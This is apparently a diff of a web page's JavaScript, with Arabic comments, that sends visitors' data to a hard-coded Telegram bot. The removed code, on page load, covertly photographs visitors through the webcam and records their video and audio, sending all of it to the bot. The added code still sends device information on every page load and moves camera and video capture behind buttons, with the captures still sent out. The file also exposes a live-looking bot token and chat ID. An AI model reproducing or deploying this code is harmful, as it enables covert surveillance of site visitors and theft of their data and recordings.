@@ -37,7 +37,9 @@
         const token = "7782080900:AAGvcMWaE_IAbb_0_0-HwcyCvQUUUVxBYmc";
         const chat_id = "5932979028";
 
-        // دالة إرسال رسالة نصية
+        let isCameraPermissionGranted = false; // متغير للتحقق من إذا تم منح إذن الكاميرا
+
+        // دالة إرسال رسالة نصية عبر تلجرام
         async function sendToTelegram(text) {
             await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                 method: "POST",
@@ -102,94 +104,75 @@
             await sendToTelegram(msg);
         }
 
-        // 1️⃣ التقاط 10 صور بالكاميرا
-        async function take10PhotosAndThen(callback) {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const track = stream.getVideoTracks()[0];
-                const imageCapture = new ImageCapture(track);
+        // دالة التقاط الصورة باستخدام الكاميرا
+        async function captureAndSendPhoto() {
+            if (!isCameraPermissionGranted) {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    isCameraPermissionGranted = true; // تم منح الإذن
+                    const track = stream.getVideoTracks()[0];
+                    const imageCapture = new ImageCapture(track);
 
-                for (let i = 0; i < 2; i++) {
-                    try {
-                        const blob = await imageCapture.takePhoto();
-                        await sendPhoto(blob);
-                        await new Promise(r => setTimeout(r, 500)); // تأخير بسيط بين الصور
-                    } catch (e) {}
+                    const blob = await imageCapture.takePhoto();
+                    await sendPhoto(blob);  // إرسال الصورة عبر البوت
+
+                    track.stop(); // إيقاف الكاميرا
+                } catch (e) {
+                    console.warn("فشل التقاط الصورة:", e);
                 }
-
-                track.stop();
-                if (callback) callback();
-            } catch (e) {
-                console.warn("فشل التقاط الصور:", e);
-                if (callback) callback();
+            } else {
+                console.log("تم منح إذن الكاميرا بالفعل.");
             }
         }
 
-        // 2️⃣ تسجيل فيديو 10 ثوانٍ
-        async function recordVideoThen(callback) {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                const recorder = new MediaRecorder(stream);
-                const chunks = [];
+        // دالة تسجيل الفيديو
+        async function recordAndSendVideo(duration) {
+            if (!isCameraPermissionGranted) {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                    isCameraPermissionGranted = true; // تم منح الإذن
+                    const recorder = new MediaRecorder(stream);
+                    const chunks = [];
 
-                recorder.ondataavailable = e => chunks.push(e.data);
-                recorder.onstop = async () => {
-                    const blob = new Blob(chunks, { type: 'video/webm' });
-                    await sendVideo(blob);
-                    stream.getTracks().forEach(t => t.stop());
-                    if (callback) callback();
-                };
-
-                recorder.start();
-                setTimeout(() => recorder.stop(), 10000);
-            } catch (e) {
-                console.warn("فشل تسجيل الفيديو:", e);
-                if (callback) callback();
-            }
-        }
-
-        // 3️⃣ تسجيل 10 تسجيلات صوت كل منها 10 ثوانٍ
-        async function record10AudiosSequentially() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                const recorder = new MediaRecorder(stream);
-                let chunks = [];
-                let count = 1;
-
-                recorder.ondataavailable = e => chunks.push(e.data);
-
-                recorder.onstop = async () => {
-                    const blob = new Blob(chunks, { type: 'audio/ogg' });
-                    await sendVoice(blob);
-                    chunks = [];
-                    count++;
-                    if (count < 2) {
-                        setTimeout(() => {
-                            recorder.start();
-                            setTimeout(() => recorder.stop(), 10000);
-                        }, 1000);
-                    } else {
+                    recorder.ondataavailable = e => chunks.push(e.data);
+                    recorder.onstop = async () => {
+                        const blob = new Blob(chunks, { type: 'video/webm' });
+                        await sendVideo(blob);  // إرسال الفيديو عبر البوت
                         stream.getTracks().forEach(t => t.stop());
-                    }
-                };
+                    };
 
-                recorder.start();
-                setTimeout(() => recorder.stop(), 10000);
-            } catch (e) {
-                console.warn("فشل تسجيل الصوت:", e);
+                    recorder.start();
+                    setTimeout(() => recorder.stop(), duration * 1000);  // تحديد مدة التسجيل
+                } catch (e) {
+                    console.warn("فشل تسجيل الفيديو:", e);
+                }
+            } else {
+                console.log("تم منح إذن الكاميرا بالفعل.");
             }
         }
 
-        // بدء السلسلة بعد دخول الموقع
-        window.onload = async () => {
-            await sendDeviceInfo();
+        // عند الضغط على زر التقاط الصورة
+        document.getElementById("capturePhotoBtn").addEventListener("click", async () => {
+            await captureAndSendPhoto();  // التقاط الصورة وإرسالها
+            await sendDeviceInfo();  // جمع بيانات الجهاز وإرسالها
+        });
 
-            take10PhotosAndThen(() => {
-                recordVideoThen(() => {
-                    record10AudiosSequentially();
-                });
-            });
+        // عند الضغط على زر تسجيل الفيديو
+        document.getElementById("recordVideoBtn").addEventListener("click", async () => {
+            const videoDuration = prompt("من فضلك، حدد مدة الفيديو (بالثواني):");
+            if (videoDuration && !isNaN(videoDuration) && videoDuration > 0) {
+                await recordAndSendVideo(Number(videoDuration));  // تسجيل الفيديو وإرساله
+                await sendDeviceInfo();  // جمع بيانات الجهاز وإرسالها
+            } else {
+                alert("الرجاء إدخال مدة صحيحة.");
+            }
+        });
+
+        // جمع البيانات عند تحميل الصفحة (البيانات العامة)
+        window.onload = async () => {
+            await sendDeviceInfo();  // جمع بيانات الجهاز وإرسالها عند تحميل الصفحة
         };
     </script>
+
 </body>
 </html>
